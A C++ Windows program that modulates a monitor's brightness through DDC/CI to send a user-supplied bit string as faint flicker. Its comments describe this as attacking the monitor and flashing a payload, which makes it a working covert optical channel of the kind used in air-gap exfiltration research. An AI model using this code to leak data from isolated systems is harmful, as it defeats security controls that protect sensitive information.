#include <chrono>
#include <highlevelmonitorconfigurationapi.h>
#include <iostream>
#include <physicalmonitorenumerationapi.h>
#include <string>
#include <thread>
#include <vector>
#include <windows.h>


#pragma comment(lib, "Dxva2.lib")

// Helper function to find all physical monitors
BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor,
                              LPRECT lprcMonitor, LPARAM dwData) {
  std::vector<HANDLE> *pMonitors =
      reinterpret_cast<std::vector<HANDLE> *>(dwData);
  DWORD numMonitors = 0;

  if (GetNumberOfPhysicalMonitorsFromHMONITOR(hMonitor, &numMonitors)) {
    PHYSICAL_MONITOR *pPhysicalMonitors = new PHYSICAL_MONITOR[numMonitors];
    if (GetPhysicalMonitorsFromHMONITOR(hMonitor, numMonitors,
                                        pPhysicalMonitors)) {
      for (DWORD i = 0; i < numMonitors; ++i) {
        pMonitors->push_back(pPhysicalMonitors[i].hPhysicalMonitor);
      }
    }
    delete[] pPhysicalMonitors;
  }
  return TRUE;
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: modulator.exe <binary_string>" << std::endl;
    std::cerr << "Example: modulator.exe 101010110" << std::endl;
    return 1;
  }

  std::string payload = argv[1];
  std::vector<HANDLE> monitors;

  // Enumerate all attached monitors
  EnumDisplayMonitors(NULL, NULL, MonitorEnumProc,
                      reinterpret_cast<LPARAM>(&monitors));

  if (monitors.empty()) {
    std::cerr << "Error: No physical monitors found." << std::endl;
    return 1;
  }

  std::cout << "[*] Found " << monitors.size() << " physical monitor(s)."
            << std::endl;

  // Assuming we attack the primary monitor for now
  HANDLE hMonitor = monitors[0];

  DWORD minBrightness = 0, currentBrightness = 0, maxBrightness = 0;
  if (!GetMonitorBrightness(hMonitor, &minBrightness, &currentBrightness,
                            &maxBrightness)) {
    std::cerr << "Error: Could not read monitor brightness. Ensure the monitor "
                 "supports DDC/CI."
              << std::endl;
    return 1;
  }

  std::cout << "[*] Current Brightness: " << currentBrightness << "%"
            << std::endl;

  // Calculate modulation thresholds (e.g., +/- 2%)
  DWORD baseLevel = currentBrightness;
  // We increase brightness for a 1, stay base for a 0
  // Make sure we don't exceed max or drop below min
  DWORD highLevel = baseLevel + 2;

  if (highLevel > maxBrightness) {
    highLevel = maxBrightness;
    baseLevel = maxBrightness - 2;
  }

  std::cout << "[!] Starting Modulator Pipeline. Flashing Payload: " << payload
            << std::endl;

  // 10 Hz Baud Rate -> 100 milliseconds per symbol
  const int BAUD_DELAY_MS = 100;

  for (char bit : payload) {
    if (bit == '1') {
      SetMonitorBrightness(hMonitor, highLevel);
    } else if (bit == '0') {
      SetMonitorBrightness(hMonitor, baseLevel);
    } else {
      // Noise/invalid character formatting fallback
      SetMonitorBrightness(hMonitor, baseLevel);
    }

    // Exact hardware sleep
    std::this_thread::sleep_for(std::chrono::milliseconds(BAUD_DELAY_MS));
  }

  // Restore sanity
  SetMonitorBrightness(hMonitor, currentBrightness);
  std::cout << "[*] Transmission complete. Brightness restored." << std::endl;

  // Cleanup resources
  DestroyPhysicalMonitor(hMonitor);

  return 0;
}
